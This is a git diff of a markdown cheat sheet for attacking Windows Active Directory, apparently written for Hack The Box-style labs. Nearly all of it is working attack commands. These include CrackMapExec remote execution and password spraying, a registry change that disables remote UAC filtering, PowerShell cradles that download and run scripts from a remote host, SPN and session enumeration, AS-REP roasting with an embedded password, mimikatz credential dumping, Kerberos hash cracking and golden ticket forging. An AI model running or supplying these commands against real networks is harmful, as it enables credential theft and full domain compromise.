@@ -184,7 +184,7 @@ crackmapexec smb 192.168.100.0/24
 ```
 
 #### Enumerate
-#Start
+#Required credentials user
 ```Shell
 cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 crackmapexec smb 192.168.100.19 -u root -p <pwd> --local-auth -x whoami 
@@ -196,13 +196,13 @@ powershell -exec Bypass -c "IEX(New-Object Net.WebClient).DownloadString('http:/
 ```
 
 ```Shell
+# Sessions
 powershell
 PS C:\> Set-ExecutionPolicy Unrestricted
 Import-Module .\PowerView.ps1
 Get-NetLoggedon -ComputerName pc-user
 Get-NetSession -ComputerName dc01
 ```
-
 ```Shell
 # Windows - Enumerate users
 net user
@@ -234,24 +234,24 @@ kerbrute userenum --domain htb.local /opt/SecLists/Usernames/xato-net-10-million
 powershell
 PS C:\> Set-ExecutionPolicy Unrestricted
 # Enumerate SPNs
-  $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
-  $PDC = ($domainObj.PdcRoleOwner).Name
-  $SearchString = "LDAP://"
-  $SearchString += $PDC + "/"
-  $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
-  $SearchString += $DistinguishedName
-  $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
-  $objDomain = New-Object System.DirectoryServices.DirectoryEntry
-  $Searcher.SearchRoot = $objDomain
-  $Searcher.filter="serviceprincipalname=*"
-  $Result = $Searcher.FindAll()
-  Foreach($obj in $Result)
-  {
-  Foreach($prop in $obj.Properties)
-  {
-  $prop
-  }
-  }
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$PDC = ($domainObj.PdcRoleOwner).Name
+$SearchString = "LDAP://"
+$SearchString += $PDC + "/"
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+$SearchString += $DistinguishedName
+$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+$objDomain = New-Object System.DirectoryServices.DirectoryEntry
+$Searcher.SearchRoot = $objDomain
+$Searcher.filter="serviceprincipalname=*"
+$Result = $Searcher.FindAll()
+Foreach($obj in $Result)
+{
+Foreach($prop in $obj.Properties)
+{
+$prop
+}
+}
 ```
 
 #### attacks
@@ -259,8 +259,6 @@ PS C:\> Set-ExecutionPolicy Unrestricted
 ##### Spray Password Spraying
 ```Shell
 crackmapexec smb <IP> -u users.txt -p passwords.txt
-```
-```Shell
 kerbrute -domain yuncorp -users users.txt -password pass.txt -outputfile output.txt
 ```
 
@@ -269,10 +267,7 @@ https://www.hackingarticles.in/abusing-kerberos-using-impacket/
 1.- Dump in memory
 2.- Request TGS
 
-impacket-GetNPUsers 'htb.local/james:J@m3s_P@ssW0rd!' -dc-ip 10.10.10.52 # Dump the full list of ASP-REP vulnerable users
-
 ###### Dump in memory
-
 ```Shell
 mimikatz.exe
 privilege::debug
@@ -330,12 +325,12 @@ hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force
 ```
 
 #### Golden ticket attack - create TGT - first get the krbtgt hash NTLM 
-#Required Admin Domain
+#Required Admin Domain - Attack to Domain controller
 
 ```Shell
 powershell
 PS C:\> Set-ExecutionPolicy Unrestricted
-PS C:\> IEX ([System.Text.Encoding]::UTF8.GetString((New-Object system.net.webClient).DownloadString('http://10.10.14.2/Invoke-Mimikatz.ps1');
+PS C:\> Import-Module .\Invoke-Mimikatz.ps1
 PS C:\> Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:krbtgt"' > output.txt
 PS C:\> Invoke-Mimikatz -Command '"kerberos::golden /domain:yuncorp.local /sid:<sid> /rc4:<krbtgt hash> /user:Administrador /ticket:golden.kirbi"' # SID get output.txt
 # Machine User Domain
